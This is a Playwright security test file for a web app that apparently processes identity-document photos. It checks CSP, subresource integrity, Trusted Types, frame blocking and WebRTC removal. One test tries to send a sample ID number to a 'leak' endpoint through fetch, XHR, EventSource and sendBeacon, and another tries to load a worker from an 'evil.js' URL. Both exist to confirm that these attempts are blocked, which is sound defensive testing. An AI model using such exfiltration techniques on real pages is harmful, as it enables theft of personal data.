// SPDX-License-Identifier: AGPL-3.0-or-later
import { expect, test, type Page } from '@playwright/test'
import { createHash } from 'node:crypto'
import { readdirSync, readFileSync } from 'node:fs'
import { cspWithScriptHashes } from '../../scripts/csp.ts'
import { fixture, appElementsInFrame, openCapture, toEditor } from './helpers.ts'

/** The inline import map's text, or null. It is the only inline script the CSP allows (by hash). */
const importMapText = async (page: Page): Promise<string | null> =>
  await page.locator('script[type="importmap"]').evaluate((s) => s.textContent).catch(() => null)

const sha = (alg: 'sha256' | 'sha384', data: string | Buffer): string => `${alg}-${createHash(alg).update(data).digest('base64')}`

test('built page carries the exact CSP and referrer policy', async ({ page }) => {
  await page.goto('/')
  const map = await importMapText(page)
  const expected = cspWithScriptHashes(map === null ? [] : [sha('sha256', map)])
  await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveAttribute('content', expected)
  await expect(page.locator('meta[name="referrer"]')).toHaveAttribute('content', 'no-referrer')
})

test('every script and stylesheet has SRI; no inline scripts or styles', async ({ page }) => {
  await page.goto('/')
  const report = await page.evaluate(() => ({
    scripts: [...document.querySelectorAll<HTMLScriptElement>('script:not([type="importmap"])')].map((s) => ({ src: s.getAttribute('src'), integrity: s.integrity, inline: !s.src && s.textContent !== '' })),
    styles: [...document.querySelectorAll('link[rel="stylesheet"]')].map((l) => (l as HTMLLinkElement).integrity),
    inlineStyles: document.querySelectorAll('style, [style]').length,
  }))
  expect(report.scripts.length).toBeGreaterThan(0)
  for (const s of report.scripts) {
    expect(s.inline).toBe(false)
    expect(s.integrity).toMatch(/^sha384-/)
  }
  for (const integrity of report.styles) expect(integrity).toMatch(/^sha384-/)
  expect(report.inlineStyles).toBe(0)
})

test('app renders with no CSP violations and no requests outside its origin', async ({ page, baseURL }) => {
  const origin = new URL(baseURL ?? '').origin
  const foreign: string[] = []
  const violations: string[] = []
  page.on('request', (r) => { if (new URL(r.url()).origin !== origin && !r.url().startsWith('blob:') && !r.url().startsWith('data:')) foreign.push(r.url()) })
  page.on('console', (m) => { if (/Content Security Policy|Trusted Type/i.test(m.text())) violations.push(m.text()) })
  page.on('pageerror', (e) => violations.push(e.message))
  await page.goto('/')
  await expect(page.locator('h1')).toBeVisible()
  expect(foreign).toEqual([])
  expect(violations).toEqual([])
})

test('without the service worker, the CSP alone stops every same-origin connection (ADR 0022)', async ({ page, context }) => {
  // Service workers are blocked in this spec: this is the first visit, a forced reload, or a browser
  // without service workers. connect-src has no 'self', so none of these leaves the page.
  const reached: string[] = []
  await context.route(/leak/, async (route) => { reached.push(`${route.request().method()} ${route.request().url()}`); await route.fulfill({ status: 200, body: '' }) })
  const violations: string[] = []
  page.on('console', (m) => { if (/connect-src/i.test(m.text())) violations.push(m.text()) })
  await page.goto('/')
  await expect(page.locator('h1')).toBeVisible()
  const results = await page.evaluate(async () => {
    const data = 'dni=12345678Z'
    const tryFetch = async (init?: RequestInit): Promise<string> => { try { await fetch(`leak?${data}`, init); return 'sent' } catch { return 'blocked' } }
    const xhr = async (): Promise<string> => await new Promise((resolve) => {
      const x = new XMLHttpRequest()
      x.onload = () => { resolve('sent') }
      x.onerror = () => { resolve('blocked') }
      try { x.open('POST', 'leak'); x.send(data) } catch { resolve('blocked') }
    })
    // WebKit refuses some of these at once with a SecurityError; that counts as blocked too.
    const source = async (): Promise<string> => await new Promise((resolve) => {
      try {
        const es = new EventSource(`leak/events?${data}`)
        es.onopen = () => { es.close(); resolve('sent') }
        es.onerror = () => { es.close(); resolve('blocked') }
      } catch { resolve('blocked') }
    })
    const beacon = (): string => {
      // eslint-disable-next-line no-restricted-properties -- this test checks that the CSP blocks it
      try { return String(navigator.sendBeacon(`leak/beacon?${data}`, data)) } catch { return 'blocked' }
    }
    return {
      get: await tryFetch(),
      post: await tryFetch({ method: 'POST', body: data }),
      header: await tryFetch({ headers: { 'x-data': data } }),
      xhr: await xhr(),
      eventSource: await source(),
      // sendBeacon() may answer true and be stopped later: only `reached` below tells.
      beacon: beacon(),
    }
  })
  expect(results).toEqual({ get: 'blocked', post: 'blocked', header: 'blocked', xhr: 'blocked', eventSource: 'blocked', beacon: results.beacon })
  // Give a beacon time to go out, if one had been queued.
  await page.waitForTimeout(500)
  expect(reached).toEqual([])
  expect(violations.length).toBeGreaterThan(0)
})

test('the build publishes no source maps and no script points to one (ADR 0022)', () => {
  const dist = new URL('../../dist/', import.meta.url)
  const files = readdirSync(dist, { recursive: true, encoding: 'utf8' })
  expect(files.filter((f) => f.endsWith('.map'))).toEqual([])
  const scripts = files.filter((f) => /\.(m?js)$/.test(f))
  expect(scripts.length).toBeGreaterThan(0)
  for (const f of scripts) expect(readFileSync(new URL(f, dist), 'utf8'), f).not.toMatch(/[#@] sourceMappingURL=/)
})

test('Trusted Types: HTML strings are rejected and no other policy can be created', async ({ page }) => {
  await page.goto('/')
  const supported = await page.evaluate(() => 'trustedTypes' in window)
  test.skip(!supported, 'This browser has no Trusted Types. tests/e2e/no-trusted-types.spec.ts covers that path.')
  const result = await page.evaluate(() => {
    const tryIt = (f: () => void): string => { try { f(); return 'allowed' } catch { return 'blocked' } }
    const tt = (window as unknown as { trustedTypes?: { createPolicy: (n: string, o: object) => unknown } }).trustedTypes
    return {
      // eslint-disable-next-line no-restricted-properties -- this test checks that the browser blocks it
      innerHTML: tryIt(() => { document.createElement('div').innerHTML = '<b>x</b>' }),
      policy: tt ? tryIt(() => tt.createPolicy('probe', {})) : 'unsupported',
      // The app already created the only allowed policy; a second copy is refused.
      defaultPolicy: tt ? tryIt(() => tt.createPolicy('default', {})) : 'unsupported',
      // The default policy refuses any script URL other than the two the app needs.
      foreignWorker: tryIt(() => { new Worker('https://example.org/evil.js').terminate() }),
      ownWorkerUrl: tryIt(() => { new Worker('ocr/worker.min.js').terminate() }),
    }
  })
  expect(result).toEqual({ innerHTML: 'blocked', policy: 'blocked', defaultPolicy: 'blocked', foreignWorker: 'blocked', ownWorkerUrl: 'allowed' })
})

test('chunks loaded on demand are listed in the import map with a matching hash', async ({ page, request }) => {
  await page.goto('/')
  const map = await importMapText(page)
  expect(map).not.toBeNull()
  const integrity = (JSON.parse(map ?? '{}') as { integrity?: Record<string, string> }).integrity ?? {}
  const entries = Object.entries(integrity)
  expect(entries.length).toBeGreaterThan(0)
  for (const [path, hash] of entries) {
    const body = await (await request.get(path)).body()
    expect(hash).toBe(sha('sha384', body))
  }
})

test.describe('tampering', () => {
  test.use({ locale: 'es-ES' })

  test('a tampered PDF chunk is refused by the browser and the export fails safely', async ({ page }) => {
    await page.route('**/assets/export-*.js', async (route) => {
      const res = await route.fetch()
      await route.fulfill({ response: res, body: (await res.text()) + '\n// tampered' })
    })
    await toEditor(page)
    await page.locator('#review').click()
    await page.locator('#review-confirm').check()
    let downloaded = false
    page.on('download', () => { downloaded = true })
    await page.locator('#download').click()
    await expect(page.locator('#download-status')).toHaveAttribute('role', 'alert')
    expect(downloaded).toBe(false)
  })
})

test.describe('hardening (security audit of 2026-11-25)', () => {
  test.use({ locale: 'es-ES' })

  test('WebRTC is removed before the app runs; the camera API stays', async ({ page }) => {
    await page.goto('/')
    await expect(page.locator('h1')).toBeVisible()
    expect(await page.evaluate(() => ({
      peer: typeof (window as unknown as Record<string, unknown>)['RTCPeerConnection'],
      webkit: typeof (window as unknown as Record<string, unknown>)['webkitRTCPeerConnection'],
      channel: typeof (window as unknown as Record<string, unknown>)['RTCDataChannel'],
      camera: typeof navigator.mediaDevices.getUserMedia,
    }))).toEqual({ peer: 'undefined', webkit: 'undefined', channel: 'undefined', camera: 'function' })
  })

  test('when a browser keeps WebRTC, the app does not start and opens no photo (audit F-14)', async ({ page }) => {
    // A browser whose RTCPeerConnection cannot be replaced: the lockdown's defineProperty fails.
    await page.addInitScript(() => {
      Object.defineProperty(window, 'RTCPeerConnection', { value: function Fake () {}, writable: false, configurable: false })
    })
    await page.goto('/')
    await expect(page.locator('#webrtc-open')).toContainText('WebRTC')
    await expect(page.locator('#start')).toHaveCount(0)
    await expect(page.locator('input[type="file"]')).toHaveCount(0)
  })

  test('the host refuses to show the app inside another page\'s frame (frame-ancestors, ADR 0027)', async ({ page, baseURL }) => {
    // Not even the page's own frame guard (#app with a link to itself): the host refused the page.
    expect(await appElementsInFrame(page, baseURL ?? '')).toBe(0)
  })

  test('on a host without headers (GitHub Pages), inside a frame the app does not start, it only links to itself', async ({ page, context, baseURL }) => {
    // The GitHub Pages copy sends no frame-ancestors: only the page's own check stops it there.
    await context.route(baseURL ?? '', async (route) => {
      const res = await route.fetch()
      await route.fulfill({ status: res.status(), headers: { 'content-type': 'text/html; charset=utf-8' }, body: await res.body() })
    })
    await page.setContent(`<iframe src="${baseURL ?? ''}" width="800" height="600"></iframe>`)
    const frame = page.frameLocator('iframe')
    await expect(frame.locator('#app a[target="_blank"]')).toHaveText(/solo funciona en su propia pestaña/)
    await expect(frame.locator('h1')).toHaveCount(0)
  })

  test('leaving the page drops the photos (nothing is kept for the back-forward cache)', async ({ page }) => {
    await openCapture(page)
    await page.locator('#file-front').setInputFiles(fixture('synthetic-front.png'))
    await expect(page.locator('#status-front')).toHaveText('Imagen cargada.')
    await page.evaluate(() => { dispatchEvent(new PageTransitionEvent('pagehide', { persisted: true })) })
    await expect(page.locator('#status-front')).not.toHaveText('Imagen cargada.')
  })

  test('a photo still decoding when the page is left is dropped too', async ({ page }) => {
    await openCapture(page)
    await expect(page.locator('#file-front')).toBeAttached()
    const png = readFileSync(fixture('synthetic-front.png')).toString('base64')
    // Choose the file and leave in the same task: the decode is still running when pagehide fires.
    await page.evaluate((b64) => {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0))
      const input = document.querySelector<HTMLInputElement>('#file-front')
      if (!input) throw new Error('no #file-front')
      const dt = new DataTransfer()
      dt.items.add(new File([bytes], 'front.png', { type: 'image/png' }))
      input.files = dt.files
      input.dispatchEvent(new Event('change'))
      dispatchEvent(new PageTransitionEvent('pagehide', { persisted: true }))
    }, png)
    // Give the decode time to finish: its result must not come back.
    await page.waitForTimeout(1500)
    await expect(page.locator('#status-front')).not.toHaveText('Imagen cargada.')
  })
})
